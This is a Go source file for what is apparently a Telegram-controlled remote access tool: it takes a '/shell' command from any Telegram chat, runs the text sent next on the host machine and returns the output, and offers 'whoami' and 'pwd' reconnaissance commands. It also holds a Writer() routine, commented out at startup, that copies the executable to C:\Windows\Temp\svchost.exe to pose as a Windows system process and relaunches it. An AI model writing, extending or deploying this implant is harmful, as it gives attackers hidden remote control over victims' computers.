package main

import (
	"flag"
	"fmt"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func init() {
	//Writer()
	var token string
	flag.StringVar(&token, "token", "", "Telegram API token")
	flag.Parse()

	if token != "" {
		os.Setenv("TELEGRAM_APITOKEN", token)
	}
}

func main() {

	bot := newBotAPI()
	botMessage(bot)

}

func newBotAPI() *tgbotapi.BotAPI {
	botToken := os.Getenv("TELEGRAM_APITOKEN")
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		panic(err)
	}

	fmt.Printf("Authorized with token %s", botToken)

	bot.Debug = true

	return bot
}

func botMessage(bot *tgbotapi.BotAPI) {

	// Create a map to track conversation states
	conversationStates := make(map[int64]string) // map[chatID]state

	updateConfig := tgbotapi.NewUpdate(0)
	updateConfig.Timeout = 30

	updates := bot.GetUpdatesChan(updateConfig)

	for update := range updates {
		if update.Message == nil {
			continue
		}

		chatID := update.Message.Chat.ID

		// Check if this user is in a conversation
		if state, exists := conversationStates[chatID]; exists {
			// Handle the conversation based on state
			handleConversation(update, bot, state, conversationStates)
			continue
		}

		if !update.Message.IsCommand() {
			continue
		}

		msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")

		// Extract the command from the Message.
		switch update.Message.Command() {
		case "shell":
			ShellCommand(msg, bot, conversationStates)

		case "whoami":
			RunWhoAmI(msg, bot)

		case "whoamips":
			RunWhoAmIPS(msg, bot)

		case "pwd":
			PresentDir(msg, bot)

		case "pwdps":

		default:
			UnknownCommand(msg, bot)
		}

	}

}

func ShellCommand(msg tgbotapi.MessageConfig, bot *tgbotapi.BotAPI, states map[int64]string) {
	msg.Text = "Please provide a command: "

	if _, err := bot.Send(msg); err != nil {
		log.Panic(err)
	}

	// Set the conversation state
	states[msg.ChatID] = "awaiting_cmd"
}

func handleConversation(update tgbotapi.Update, bot *tgbotapi.BotAPI, state string, states map[int64]string) {
	chatID := update.Message.Chat.ID

	// Handle different conversation states
	switch state {
	case "awaiting_cmd":
		// The user is providing cmd command
		userInput := update.Message.Text

		cmd := exec.Command(userInput)

		// Execute the command and capture the output
		output, err := cmd.Output()
		if err != nil {
			fmt.Printf("Error executing command: %v\n", err)
			return
		}

		// Convert the output to a string and remove trailing newline
		shellOutput := strings.TrimSpace(string(output))

		response := tgbotapi.NewMessage(chatID, "Shell Output: "+shellOutput)

		if _, err := bot.Send(response); err != nil {
			log.Println("Error sending message:", err)
		}

		// Clear the state - conversation is complete
		delete(states, chatID)

	// Add more conversation states as needed
	default:
		// Unknown state - clear it
		delete(states, chatID)
	}
}

func UnknownCommand(msg tgbotapi.MessageConfig, bot *tgbotapi.BotAPI) {
	msg.Text = "I don't know that command"
	if _, err := bot.Send(msg); err != nil {
		log.Panic(err)
	}
}

func RunWhoAmI(msg tgbotapi.MessageConfig, bot *tgbotapi.BotAPI) {
	cmd := exec.Command("whoami")

	// Execute the command and capture the output
	output, err := cmd.Output()
	if err != nil {
		fmt.Printf("Error executing command: %v\n", err)
		return
	}

	// Convert the output to a string and remove trailing newline
	whoami := strings.TrimSpace(string(output))
	msg.Text = whoami
	if _, err := bot.Send(msg); err != nil {
		log.Panic(err)
	}
}

func PresentDir(msg tgbotapi.MessageConfig, bot *tgbotapi.BotAPI) {
	cmd := exec.Command("pwd")

	// Execute the command and capture the output
	output, err := cmd.Output()
	if err != nil {
		fmt.Printf("Error executing command: %v\n", err)
		return
	}

	// Convert the output to a string and remove trailing newline
	pwd := strings.TrimSpace(string(output))
	msg.Text = pwd
	if _, err := bot.Send(msg); err != nil {
		log.Panic(err)
	}
}

func Writer() {
	// Define the target path where we want our executable to be
	targetPath := `C:\Windows\Temp\svchost.exe`

	// Get the current executable path
	currentExePath, err := os.Executable()
	if err != nil {
		fmt.Println("Error getting current executable path:", err)
		return
	}

	// Convert paths to lowercase for case-insensitive comparison (Windows paths)
	currentPathLower := strings.ToLower(currentExePath)
	targetPathLower := strings.ToLower(targetPath)

	// Check if we're already running from the target location
	if currentPathLower == targetPathLower {
		fmt.Println("Running from the correct location:", targetPath)
		return
	}

	// If we're not at the target location, we need to copy ourselves there
	fmt.Println("Not running from target location.")
	fmt.Println("Current location:", currentExePath)
	fmt.Println("Target location:", targetPath)

	// Create the target directory if it doesn't exist
	targetDir := filepath.Dir(targetPath)
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		fmt.Println("Error creating target directory:", err)
		return
	}

	// Open the current executable for reading
	fmt.Println("Reading contents of current executable...")
	sourceFile, err := os.Open(currentExePath)
	if err != nil {
		fmt.Println("Error opening source file:", err)
		return
	}
	defer sourceFile.Close()

	// Create the target file for writing
	fmt.Println("Creating target file:", targetPath)
	targetFile, err := os.Create(targetPath)
	if err != nil {
		fmt.Println("Error creating target file:", err)
		return
	}
	defer targetFile.Close()

	// Copy the executable
	fmt.Println("Copying executable to target location...")
	_, err = io.Copy(targetFile, sourceFile)
	if err != nil {
		fmt.Println("Error copying file:", err)
		return
	}

	// Make sure the file is closed before executing it
	targetFile.Close()

	// Execute the new copy
	fmt.Println("Launching new process from:", targetPath)
	cmd := exec.Command(targetPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	if err := cmd.Start(); err != nil {
		fmt.Println("Error starting new process:", err)
		return
	}

	fmt.Println("New process started. Terminating current process.")
	// Exit the current process
	os.Exit(0)
}

func RunWhoAmIPS(msg tgbotapi.MessageConfig, bot *tgbotapi.BotAPI) {
	// Use PowerShell to get the current username on Windows
	cmd := exec.Command("powershell", "-Command", "$env:USERNAME")

	// Execute the command and capture the output
	output, err := cmd.Output()
	if err != nil {
		fmt.Printf("Error executing PowerShell command: %v\n", err)
		msg.Text = "Failed to get username via PowerShell: " + err.Error()
	} else {
		// Convert the output to a string and remove trailing newline
		username := strings.TrimSpace(string(output))
		msg.Text = "PowerShell username: " + username
	}

	if _, err := bot.Send(msg); err != nil {
		log.Println("Error sending message:", err)
	}
}

func PresentDirPS(msg tgbotapi.MessageConfig, bot *tgbotapi.BotAPI) {
	// Use PowerShell to get the current directory on Windows
	cmd := exec.Command("powershell", "-Command", "(Get-Location).Path")

	// Execute the command and capture the output
	output, err := cmd.Output()
	if err != nil {
		fmt.Printf("Error executing PowerShell command: %v\n", err)
		msg.Text = "Failed to get current directory via PowerShell: " + err.Error()
	} else {
		// Convert the output to a string and remove trailing newline
		currentDir := strings.TrimSpace(string(output))
		msg.Text = "PowerShell directory: " + currentDir
	}

	if _, err := bot.Send(msg); err != nil {
		log.Println("Error sending message:", err)
	}
}
